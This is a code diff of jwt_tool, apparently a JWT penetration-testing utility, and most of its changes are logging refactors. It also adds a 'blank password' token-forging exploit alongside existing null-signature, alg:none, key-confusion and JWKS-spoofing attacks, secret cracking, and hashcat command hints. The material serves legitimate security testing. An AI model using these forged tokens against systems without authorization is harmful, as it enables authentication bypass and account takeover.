+                cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
                 valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)
             except:
                 pass
     except:
-        print("Single key file")
+        cprintc("Single key file", "white")
         for jkey in jwksDict:
-            cprint("[+] "+jkey+" = "+str(jwksDict[jkey]), "green")
+            cprintc("[+] "+jkey+" = "+str(jwksDict[jkey]), "green")
         try:
             kid = 1
             x = str(jwksDict["x"])
             y = str(jwksDict["y"])
-            print("\nFound ECC key factors, generating a public key")
+            cprintc("\nFound ECC key factors, generating a public key", "cyan")
             pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)
-            cprint("[+] "+pubkeyName, "green")
-            print("\nAttempting to verify token using "+pubkeyName)
+            cprintc("[+] "+pubkeyName, "green")
+            cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
             valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)
         except:
             pass
@@ -1050,10 +1062,10 @@ def parseJWKS(jwksfile):
             kid = 1
             n = str(jwksDict["n"])
             e = str(jwksDict["e"])
-            print("\nFound RSA key factors, generating a public key")
+            cprintc("\nFound RSA key factors, generating a public key", "cyan")
             pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
-            cprint("[+] "+pubkeyName, "green")
-            print("\nAttempting to verify token using "+pubkeyName)
+            cprintc("[+] "+pubkeyName, "green")
+            cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
             valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)
         except:
             pass
@@ -1157,130 +1169,110 @@ def dissectPayl(paylDict, count=False):
             if claim == "exp":
                 if int(timestamp.timestamp()) < nowtime:
                     expiredtoken = True
-            cprint("["+placeholder+"] "+claim+" = "+str(paylDict[claim])+"    ==> TIMESTAMP = "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC)", "green")
+            cprintc("["+placeholder+"] "+claim+" = "+str(paylDict[claim])+"    ==> TIMESTAMP = "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC)", "green")
             timeseen += 1
             comparestamps.append(claim)
         elif isinstance(paylDict[claim], dict):
-                cprint("["+placeholder+"] "+claim+" = JSON object:", "green")
+                cprintc("["+placeholder+"] "+claim+" = JSON object:", "green")
                 for subclaim in paylDict[claim]:
                     if type(castInput(paylDict[claim][subclaim])) == str:
-                        cprint("    [+] "+subclaim+" = \""+str(paylDict[claim][subclaim])+"\"", "green")
+                        cprintc("    [+] "+subclaim+" = \""+str(paylDict[claim][subclaim])+"\"", "green")
                     elif paylDict[claim][subclaim] == None:
-                        cprint("    [+] "+subclaim+" = null", "green")
+                        cprintc("    [+] "+subclaim+" = null", "green")
                     elif paylDict[claim][subclaim] == True and not paylDict[claim][subclaim] == 1:
-                        cprint("    [+] "+subclaim+" = true", "green")
+                        cprintc("    [+] "+subclaim+" = true", "green")
                     elif paylDict[claim][subclaim] == False and not paylDict[claim][subclaim] == 0:
-                        cprint("    [+] "+subclaim+" = false", "green")
+                        cprintc("    [+] "+subclaim+" = false", "green")
                     else:
-                        cprint("    [+] "+subclaim+" = "+str(paylDict[claim][subclaim]), "green")
+                        cprintc("    [+] "+subclaim+" = "+str(paylDict[claim][subclaim]), "green")
         else:
             if type(paylDict[claim]) == str:
-                cprint("["+placeholder+"] "+claim+" = \""+str(paylDict[claim])+"\"", "green")
+                cprintc("["+placeholder+"] "+claim+" = \""+str(paylDict[claim])+"\"", "green")
             else:
-                cprint("["+placeholder+"] "+claim+" = "+str(paylDict[claim]), "green")
+                cprintc("["+placeholder+"] "+claim+" = "+str(paylDict[claim]), "green")
     return comparestamps, expiredtoken
 
 def validateToken(jwt):
     try:
         headB64, paylB64, sig = jwt.split(".",3)
     except:
-        cprint("[-] Invalid token:\nNot 3 parts -> header.payload.signature", "red")
+        cprintc("[-] Invalid token:\nNot 3 parts -> header.payload.signature", "red")
         exit(1)
     try:
         sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))).decode('UTF-8').strip("=")
     except:
-        cprint("[-] Invalid token:\nCould not base64-decode SIGNATURE - incorrect formatting/invalid characters", "red")
-        print("----------------")
-        cprint(headB64, "cyan")
-        cprint(paylB64, "cyan")
-        cprint(sig, "red")
+        cprintc("[-] Invalid token:\nCould not base64-decode SIGNATURE - incorrect formatting/invalid characters", "red")
+        cprintc("----------------", "white")
+        cprintc(headB64, "cyan")
+        cprintc(paylB64, "cyan")
+        cprintc(sig, "red")
         exit(1)
     contents = headB64+"."+paylB64
     contents = contents.encode()
     try:
         head = base64.urlsafe_b64decode(headB64 + "=" * (-len(headB64) % 4))
     except:
-        cprint("[-] Invalid token:\nCould not base64-decode HEADER - incorrect formatting/invalid characters", "red")
-        print("----------------")
-        cprint(headB64, "red")
-        cprint(paylB64, "cyan")
-        cprint(sig, "cyan")
+        cprintc("[-] Invalid token:\nCould not base64-decode HEADER - incorrect formatting/invalid characters", "red")
+        cprintc("----------------", "white")
+        cprintc(headB64, "red")
+        cprintc(paylB64, "cyan")
+        cprintc(sig, "cyan")
         exit(1)
     try:
         payl = base64.urlsafe_b64decode(paylB64 + "=" * (-len(paylB64) % 4))
     except:
-        cprint("[-] Invalid token:\nCould not base64-decode PAYLOAD - incorrect formatting/invalid characters", "red")
-        print("----------------")
-        cprint(headB64, "cyan")
-        cprint(paylB64, "red")
-        cprint(sig, "cyan")
+        cprintc("[-] Invalid token:\nCould not base64-decode PAYLOAD - incorrect formatting/invalid characters", "red")
+        cprintc("----------------", "white")
+        cprintc(headB64, "cyan")
+        cprintc(paylB64, "red")
+        cprintc(sig, "cyan")
         exit(1)
     try:
         headDict = json.loads(head, object_pairs_hook=OrderedDict)
     except:
-        cprint("[-] Invalid token:\nHEADER not valid JSON format", "red")
+        cprintc("[-] Invalid token:\nHEADER not valid JSON format", "red")
 
-        cprint(head.decode('UTF-8'))
+        cprintc(head.decode('UTF-8'))
         exit(1)
     if payl.decode() == "":
-        print("Payload is blank")
+        cprintc("Payload is blank", "white")
         paylDict = {}
     else:
         try:
             paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
         except:
-            cprint("[-] Invalid token:\nPAYLOAD not valid JSON format", "red")
-            cprint(payl.decode('UTF-8'))
+            cprintc("[-] Invalid token:\nPAYLOAD not valid JSON format", "red")
+            cprintc(payl.decode('UTF-8'))
             exit(1)
     return headDict, paylDict, sig, contents
 
-# def exploreToken(headDict, paylDict):
-#     print("\n=====================\nExamine Token Values:\n=====================")
-#     claims = 0
-#     for claim in headDict:
-#         if claim == "jku":
-#             cprint("\n[-] jku: The 'JWKS URL' claim in the header is used to define the location of a JWKS file - a JSON file that stores signing key data. The main vulnerabilities here are:\n     [*] the JWKS could contain private key data\n     [*] the URL could be tampered with to point to a malicious JWKS\n     [*] tampering a URL could force a lookup, leading to SSRF conditions", "red")
-#             claims += 1
-#         elif claim == "kid":
-#             cprint("\n[-] kid: The 'key ID' claim in the header identifies the key used for signing the token. This could be a key stored in a JWKS file at an externally-accessible URL (especially one named in a 'jku' claim), a similarly-named public key on the server's file system, a JWKS file on the server's file system, or within a JWKS file somewhere accessible only to the server. The main vulnerabilities here are tampering the value to:\n     [*] prompt verbose errors\n     [*] redirect to an alternative internal file to use for signing\n     [*] perform command injection\n     [*] perform other injection attacks", "red")
-#             claims += 1
-#         elif claim == "x5u":
-#             cprint("\n[-] x5u: The 'x509 Certificate URL' claim in the header is used to define the location of an x509 Certificate, used to sign the token - usually stored within a JWKS file that stores signing key data. The main vulnerabilities here are:\n     [*] the x509 could contain sensitive data\n[*] the URL could be tampered with to point to a malicious x509 Certificate\n     [*] tampering a URL could force a lookup, leading to SSRF conditions", "red")
-#             claims += 1
-#     for claim in paylDict:
-#         if claim == "iss":
-#             cprint("\n[-] iss: The 'issuer' claim in the payload is used to define the 'principal' that issued the JWT. The main vulnerabilities here are:\n     [*] a URL that reveals sensitive data.\n     [*] tampering a URL could force a lookup, leading to SSRF conditions", "red")
-#             claims += 1
-#     if claims == 0:
-#         print("\nNo commonly-known vulnerable claims identified.\n")
-
 def rejigToken(headDict, paylDict, sig):
-    print("=====================\nDecoded Token Values:\n=====================")
-    print("\nToken header values:")
+    cprintc("=====================\nDecoded Token Values:\n=====================", "white")
+    cprintc("\nToken header values:", "white")
     for claim in headDict:
         if isinstance(headDict[claim], dict):
-            cprint("[+] "+claim+" = JSON object:", "green")
+            cprintc("[+] "+claim+" = JSON object:", "green")
             for subclaim in headDict[claim]:
                 if headDict[claim][subclaim] == None:
-                    cprint("    [+] "+subclaim+" = null", "green")
+                    cprintc("    [+] "+subclaim+" = null", "green")
                 elif headDict[claim][subclaim] == True:
-                    cprint("    [+] "+subclaim+" = true", "green")
+                    cprintc("    [+] "+subclaim+" = true", "green")
                 elif headDict[claim][subclaim] == False: 
-                    cprint("    [+] "+subclaim+" = false", "green")
+                    cprintc("    [+] "+subclaim+" = false", "green")
                 elif type(headDict[claim][subclaim]) == str:
-                    cprint("    [+] "+subclaim+" = \""+str(headDict[claim][subclaim])+"\"", "green")
+                    cprintc("    [+] "+subclaim+" = \""+str(headDict[claim][subclaim])+"\"", "green")
                 else:
-                    cprint("    [+] "+subclaim+" = "+str(headDict[claim][subclaim]), "green")
+                    cprintc("    [+] "+subclaim+" = "+str(headDict[claim][subclaim]), "green")
         else:
             if type(headDict[claim]) == str:
-                cprint("[+] "+claim+" = \""+str(headDict[claim])+"\"", "green")
+                cprintc("[+] "+claim+" = \""+str(headDict[claim])+"\"", "green")
             else:
-                cprint("[+] "+claim+" = "+str(headDict[claim]), "green")
-    print("\nToken payload values:")
+                cprintc("[+] "+claim+" = "+str(headDict[claim]), "green")
+    cprintc("\nToken payload values:", "white")
     comparestamps, expiredtoken = dissectPayl(paylDict)
     if len(comparestamps) >= 2:
-        print("\nSeen timestamps:")
-        cprint("[*] "+comparestamps[0]+" was seen", "green")
+        cprintc("\nSeen timestamps:", "white")
+        cprintc("[*] "+comparestamps[0]+" was seen", "green")
         claimnum = 0
         for claim in comparestamps:
             timeoff = int(paylDict[comparestamps[claimnum]])-int(paylDict[comparestamps[0]])
@@ -1302,14 +1294,14 @@ def rejigToken(headDict, paylDict, sig):
                 if timeoff < 0:
                     timeoff = timeoff*-1
                     prepost = "[*] "+claim+" is earlier than "+comparestamps[0]+" by: "
-                    cprint(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
+                    cprintc(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
                 else:
                     prepost = "[*] "+claim+" is later than "+comparestamps[0]+" by: "
-                    cprint(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
+                    cprintc(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
             claimnum += 1
     if expiredtoken:
-        cprint("[-] TOKEN IS EXPIRED!", "red")
-    print("\n----------------------\nJWT common timestamps:\niat = IssuedAt\nexp = Expires\nnbf = NotBefore\n----------------------\n")
+        cprintc("[-] TOKEN IS EXPIRED!", "red")
+    cprintc("\n----------------------\nJWT common timestamps:\niat = IssuedAt\nexp = Expires\nnbf = NotBefore\n----------------------\n", "white")
     return headDict, paylDict, sig
 
 def searchLog(logID):
@@ -1327,16 +1319,16 @@ def searchLog(logID):
             try:
                 jwt = re.findall('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', qResult)[-1]
             except:
-                cprint("JWT not included in log", "red")
+                cprintc("JWT not included in log", "red")
                 exit(1)
-            cprint(logID+"\n"+qOutput, "green")
-            print("JWT from request:")
-            cprint(jwt, "green")
+            cprintc(logID+"\n"+qOutput, "green")
+            cprintc("JWT from request:", "cyan")
+            cprintc(jwt, "green")
             headDict, paylDict, sig, contents = validateToken(jwt)
             rejigToken(headDict, paylDict, sig)
             return jwt
         else:
-            cprint("ID not found in logfile", "red")
+            cprintc("ID not found in logfile", "red")
 
 def injectOut(newheadDict, newpaylDict):
     if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.sign:
@@ -1348,7 +1340,7 @@ def injectOut(newheadDict, newpaylDict):
         runActions()
 
 def scanModePlaybook():
-    cprint("\nLAUNCHING SCAN: JWT Attack Playbook", "magenta")
+    cprintc("\nLAUNCHING SCAN: JWT Attack Playbook", "magenta")
     origalg = headDict["alg"]
     # No token
     tmpCookies = config['argvals']['cookies']
@@ -1358,7 +1350,6 @@ def scanModePlaybook():
     elif config['argvals']['headerloc'] == "headers":
         config['argvals']['header'] = ""
     config['argvals']['overridesub'] = "true"
-    jwtOut(jwt, "No token", "No token was sent to check if the token is required")
     config['argvals']['cookies'] = tmpCookies
     config['argvals']['header'] = tmpHeader
     # Broken sig
@@ -1371,10 +1362,15 @@ def scanModePlaybook():
     jwtOut(jwt, "Persistence check 2 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
     # Weak HMAC secret
     if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
-        cprint("Testing "+headDict['alg']+" token against common JWT secrets (jwt-common.txt)", "cyan")
+        cprintc("Testing "+headDict['alg']+" token against common JWT secrets (jwt-common.txt)", "cyan")
         config['argvals']['keyList'] = "jwt-common.txt"
         crackSig(sig, contents)
-    # Exploit: null signature
+    # Exploit: blank password accepted in signature
+    key = ""
+    newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
+    jwtBlankPw = newContents+"."+newSig
+    jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature (-X b)", "This token can exploit a hard-coded bank password in the config")
+    # Exploit: null signature      
     jwtNull = checkNullSig(contents)
     jwtOut(jwtNull, "Exploit: Null signature (-X n)", "This token was sent to check if a null signature can bypass checks")
     # Exploit: alg:none
@@ -1465,33 +1461,33 @@ def scanModePlaybook():
             injectExternalInteractionHeader(config['services']['httplistener']+"/inject_existing_", headerClaim)
         for payloadClaim in paylDict:
             injectExternalInteractionPayload(config['services']['httplistener']+"/inject_existing_", payloadClaim)
-        cprint("External service interactions have been tested - check your listener for interactions", "green")
+        cprintc("External service interactions have been tested - check your listener for interactions", "green")
     else:
-        cprint("External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option", "red")
-    cprint("Scanning mode completed: review the above results.\n", "magenta")
+        cprintc("External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option", "red")
+    cprintc("Scanning mode completed: review the above results.\n", "magenta")
     # Further manual testing: check expired token, brute key, find Public Key, run other scans
-    cprint("The following additional checks should be performed that are better tested manually:", "magenta")
+    cprintc("The following additional checks should be performed that are better tested manually:", "magenta")
     if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
-        cprint("[+] Try testing "+headDict['alg'][:2]+" token against weak password configurations by running the following hashcat cracking options:", "green")
-        cprint("(Already testing against passwords in jwt-common.txt)", "cyan")
-        cprint("Try using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6", "cyan")
+        cprintc("[+] Try testing "+headDict['alg'][:2]+" token against weak password configurations by running the following hashcat cracking options:", "green")
+        cprintc("(Already testing against passwords in jwt-common.txt)", "cyan")
+        cprintc("Try using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6", "cyan")
     if headDict['alg'][:2] != "HS" and headDict['alg'][:2] != "hs":
-        cprint("[+] Try hunting for a Public Key for this token. Validate any JWKS you find (-V -jw [jwks_file]) and then use the generated Public Key file with the Playbook Scan (-pk [kid_from_jwks].pem)", "green")
-        cprint("Common locations for Public Keys are either the web application's SSL key, or stored as a JWKS file in one of these locations:", "cyan")
+        cprintc("[+] Try hunting for a Public Key for this token. Validate any JWKS you find (-V -jw [jwks_file]) and then use the generated Public Key file with the Playbook Scan (-pk [kid_from_jwks].pem)", "green")
+        cprintc("Common locations for Public Keys are either the web application's SSL key, or stored as a JWKS file in one of these locations:", "cyan")
         with open('jwks-common.txt', "r", encoding='utf-8', errors='ignore') as jwksLst:
             nextVal = jwksLst.readline().rstrip()
             while nextVal:
-                cprint(nextVal, "cyan")
+                cprintc(nextVal, "cyan")
                 nextVal = jwksLst.readline().rstrip()
     try:
         timestamp = datetime.fromtimestamp(int(paylDict['exp']))
-        cprint("[+] Try waiting for the token to expire (\"exp\" value set to: "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC))", "green")
-        cprint("Check if still working once expired.", "cyan")
+        cprintc("[+] Try waiting for the token to expire (\"exp\" value set to: "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC))", "green")
+        cprintc("Check if still working once expired.", "cyan")
     except:
         pass
 
 def scanModeErrors():
-    cprint("\nLAUNCHING SCAN: Forced Errors", "magenta")
+    cprintc("\nLAUNCHING SCAN: Forced Errors", "magenta")
     # Inject dangerous content-types into existing header claims
     injectEachHeader(None)
     injectEachHeader(True)
@@ -1504,10 +1500,10 @@ def scanModeErrors():
     injectEachPayload(False)
     injectEachPayload("jwt_tool")
     injectEachPayload(0)
-    cprint("Scanning mode completed: review the above results.\n", "magenta")
+    cprintc("Scanning mode completed: review the above results.\n", "magenta")
 
 def scanModeCommonClaims():
-    cprint("\nLAUNCHING SCAN: Common Claim Injection", "magenta")
+    cprintc("\nLAUNCHING SCAN: Common Claim Injection", "magenta")
     # Inject external URLs into common claims
     with open(config['input']['commonHeaders'], "r", encoding='utf-8', errors='ignore') as commonHeaders:
         nextHeader = commonHeaders.readline().rstrip()
@@ -1526,7 +1522,7 @@ def scanModeCommonClaims():
     injectCommonClaims("jwt_tool")
     injectCommonClaims(0)
     
-    cprint("Scanning mode completed: review the above results.\n", "magenta")
+    cprintc("Scanning mode completed: review the above results.\n", "magenta")
 
 def injectCommonClaims(contentVal):
     with open(config['input']['commonHeaders'], "r", encoding='utf-8', errors='ignore') as commonHeaders:
@@ -1625,16 +1621,16 @@ def reflectedClaims():
         tmpContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
         jwtOut(tmpContents+"."+sig, "Claim processing check in "+claim+" claim", "Token sent to check if the signature is checked before the "+claim+" claim is processed")
         if checkVal+claim in config['argvals']['rescontent']:
-            cprint("Injected value in "+claim+" claim was observed - "+checkVal+claim, "red")
+            cprintc("Injected value in "+claim+" claim was observed - "+checkVal+claim, "red")
         paylDict[claim] = tmpValue
 
 
 def preScan():
-    cprint("Running prescan checks...", "cyan")
+    cprintc("Running prescan checks...", "cyan")
     jwtOut(jwt, "Prescan: original token", "Prescan: original token")
     if config['argvals']['canaryvalue']:
         if config['argvals']['canaryvalue'] not in config['argvals']['rescontent']:
-            cprint("Canary value ("+config['argvals']['canaryvalue']+") was not found in base request - check that this token is valid and you are still logged in", "red")
+            cprintc("Canary value ("+config['argvals']['canaryvalue']+") was not found in base request - check that this token is valid and you are still logged in", "red")
             shallWeGoOn = input("Do you wish to continue anyway? (\"Y\" or \"N\")")
             if shallWeGoOn == "N":
                 exit(1)
@@ -1643,7 +1639,7 @@ def preScan():
     nullResSize, nullResCode = config['argvals']['ressize'], config['argvals']['rescode']
     if config['argvals']['canaryvalue'] == "":
         if origResCode == nullResCode:
-            cprint("Valid and missing token requests return the same Status Code.\nYou should probably specify something from the page that identifies the user is logged-in (e.g. -cv \"Welcome back, ticarpi!\")", "red")
+            cprintc("Valid and missing token requests return the same Status Code.\nYou should probably specify something from the page that identifies the user is logged-in (e.g. -cv \"Welcome back, ticarpi!\")", "red")
             shallWeGoOn = input("Do you wish to continue anyway? (\"Y\" or \"N\")")
             if shallWeGoOn == "N":
                 exit(1)
@@ -1651,12 +1647,12 @@ def preScan():
     jwtOut(jwtTweak, "Prescan: Broken signature", "This token was sent to check if the signature is being checked")
     jwtOut(jwt, "Prescan: repeat original token", "Prescan: repeat original token")
     if origResCode != config['argvals']['rescode']:
-        cprint("Original token not working after invalid submission. Testing will need to be done manually, re-authenticating after each invalid submission", "red")
+        cprintc("Original token not working after invalid submission. Testing will need to be done manually, re-authenticating after each invalid submission", "red")
         exit(1)
 
 
 def runScanning():
-    cprint("Running Scanning Module:", "cyan")
+    cprintc("Running Scanning Module:", "cyan")
     preScan()
     if config['argvals']['scanMode'] == "pb":
         scanModePlaybook()
@@ -1684,6 +1680,13 @@ def runExploits():
             desc = "EXPLOIT: null signature\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(jwtNull, "Exploit: Null signature", desc)
             # exit(1)
+        elif args.exploit == "b":
+            key = ""
+            newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
+            jwtBlankPw = newContents+"."+newSig
+            desc = "EXPLOIT: Blank password accepted in signature\n(This will only be valid on unpatched implementations of JWT.)"
+            jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature", desc)
+            # exit(1)
         elif args.exploit == "i":
             newSig, newContents = jwksEmbed(headDict, paylDict)
             desc = "EXPLOIT: injected JWKS\n(This will only be valid on unpatched implementations of JWT.)"
@@ -1694,12 +1697,12 @@ def runExploits():
                 jku = config['services']['jwksloc']
                 newContents, newSig = exportJWKS(jku)
                 if config['services']['jwksloc'] == args.jwksurl:
-                    cprint("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
+                    cprintc("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
                 desc = "Signed with JWKS at "+config['services']['jwksloc']
                 jwtOut(newContents+"."+newSig, "Spoof JWKS", desc)          
                 # exit(1)
             else:
-                print("No URL provided to spoof the JWKS (-u)\n")
+                cprintc("No URL provided to spoof the JWKS (-u)\n", "red")
                 parser.print_usage()
             # exit(1)
         elif args.exploit == "k":
@@ -1708,7 +1711,7 @@ def runExploits():
                 desc = "EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)\n(This will only be valid on unpatched implementations of JWT.)"
                 jwtOut(newTok+"."+newSig, "RSA Key Confusion Exploit", desc)
             else:
-                cprint("No Public Key provided (-pk)\n", "red")
+                cprintc("No Public Key provided (-pk)\n", "red")
                 parser.print_usage()
             # exit(1)
 
@@ -1729,44 +1732,42 @@ def runActions():
                 if config['crypto']['pubkey']:
                     verifyTokenEC(headDict, paylDict, sig, config['crypto']['pubkey'])
                 else:
-                    cprint("No Public Key provided (-pk)\n", "red")
+                    cprintc("No Public Key provided (-pk)\n", "red")
                     parser.print_usage()
                 exit(1)
             elif algType == "PS":
                 if config['crypto']['pubkey']:
                     verifyTokenPSS(headDict, paylDict, sig, config['crypto']['pubkey'])
                 else:
-                    cprint("No Public Key provided (-pk)\n", "red")
+                    cprintc("No Public Key provided (-pk)\n", "red")
                     parser.print_usage()
                 exit(1)
             else:
-                cprint("Algorithm not supported for verification", "red")
+                cprintc("Algorithm not supported for verification", "red")
                 exit(1)
         elif args.jwksfile:
             parseJWKS(config['crypto']['jwks'])
         else:
-            cprint("No Public Key or JWKS file provided (-pk/-jw)\n", "red")
+            cprintc("No Public Key or JWKS file provided (-pk/-jw)\n", "red")
             parser.print_usage()
         exit(1)
     runExploits()
     if args.crack:
         if args.password:
-            cprint("Password provided, checking if valid...", "cyan")
+            cprintc("Password provided, checking if valid...", "cyan")
             checkSig(sig, contents, config['argvals']['key'])
         elif args.dict:
             crackSig(sig, contents)
         elif args.keyfile:
             checkSigKid(sig, contents)
         else:
-            cprint("No cracking option supplied:\nPlease specify a password/dictionary/Public Key\n", "red")
+            cprintc("No cracking option supplied:\nPlease specify a password/dictionary/Public Key\n", "red")
             parser.print_usage()
         exit(1)
     if args.query and config['argvals']['sigType'] != "":
         signingToken(headDict, paylDict)
 
-
-if __name__ == '__main__':
-# Print logo
+def printLogo():
     print()
     print("   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\                  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ ")
     print("   \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m | \x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __| \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __|                 \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
@@ -1779,9 +1780,12 @@ if __name__ == '__main__':
     print(" \x1b[36mVersion "+jwttoolvers+"          \x1b[0m      \______|             \x1b[36m@ticarpi\x1b[0m      ")
     print()
 
+if __name__ == '__main__':
     parser = argparse.ArgumentParser(epilog="If you don't have a token, try this one:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po", formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument("jwt", nargs='?', type=str,
                         help="the JWT to tinker with (no need to specify if in header/cookies)")
+    parser.add_argument("-b", "--bare", action="store_true",
+                        help="return TOKENS ONLY")
     parser.add_argument("-t", "--targeturl", action="store",
                         help="URL to send HTTP request to with new JWT")
     parser.add_argument("-rc", "--cookies", action="store",
@@ -1794,36 +1798,18 @@ if __name__ == '__main__':
                         help="text string that appears in response for valid token (e.g. \"Welcome, ticarpi\")")
     parser.add_argument("-np", "--noproxy", action="store_true",
                         help="disable proxy for current request (change in jwtconf.ini if permanent)")
-    parser.add_argument("-T", "--tamper", action="store_true",
-                        help="tamper with the JWT contents\n(set signing options with -S or use exploits with -X)")
     parser.add_argument("-M", "--mode", action="store",
                         help="Scanning mode:\npb = playbook audit\ner = fuzz existing claims to force errors\ncc = fuzz common claims\nat - All Tests!")
-    parser.add_argument("-C", "--crack", action="store_true",
-                        help="crack key for an HMAC-SHA token\n(specify -d/-k/-p)")
-    parser.add_argument("-V", "--verify", action="store_true",
-                        help="verify the RSA signature against a Public Key\n(specify -pk/-jw)")
     parser.add_argument("-X", "--exploit", action="store",
-                        help="eXploit known vulnerabilities:\nn = null signature\na = alg:none\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
-    parser.add_argument("-S", "--sign", action="store",
-                        help="sign the resulting token:\nhs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)\nrs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)\nec256/ec384/ec512 = Elliptic Curve signing (specify an EC private key with -pr)\nps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)")
-    parser.add_argument("-I", "--injectclaims", action="store_true",
-                        help="inject new claims and update existing claims with new values\n(set signing options with -S or use exploits with -X)\n(set target claim with -hc/-pc and injection values/lists with -hv/-pv")
-    parser.add_argument("-Q", "--query", action="store",
-                        help="Query a token ID against the logfile to see the details of that request\ne.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a")
-    parser.add_argument("-d", "--dict", action="store",
-                        help="dictionary file for cracking")
-    parser.add_argument("-p", "--password", action="store",
-                        help="password for cracking")
-    parser.add_argument("-kf", "--keyfile", action="store",
-                        help="keyfile for cracking (when signed with 'kid' attacks)")
-    parser.add_argument("-pk", "--pubkey", action="store",
-                        help="Public Key for Asymmetric crypto")
-    parser.add_argument("-pr", "--privkey", action="store",
-                        help="Private Key for Asymmetric crypto")
-    parser.add_argument("-jw", "--jwksfile", action="store",
-                        help="JSON Web Key Store for Asymmetric crypto")
+                        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
     parser.add_argument("-ju", "--jwksurl", action="store",
                         help="URL location where you can host a spoofed JWKS")
+    parser.add_argument("-S", "--sign", action="store",
